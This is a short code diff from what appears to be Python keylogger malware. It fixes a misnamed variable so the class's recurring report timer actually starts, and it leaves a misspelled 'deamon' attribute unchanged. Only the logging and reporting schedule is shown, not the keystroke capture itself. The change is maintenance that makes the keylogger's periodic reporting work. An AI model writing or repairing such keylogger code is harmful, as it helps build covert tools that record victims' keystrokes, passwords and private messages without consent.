@@ -70,7 +70,7 @@ class Keylogger:
 				self.report_to_file()
 			self.start_dt = datetime.now()
 		self.log = ""
-		time = Timer(interval=self.interval, function=self.report)
+		timer = Timer(interval=self.interval, function=self.report)
 		timer.deamon = True
 		timer.start()
 
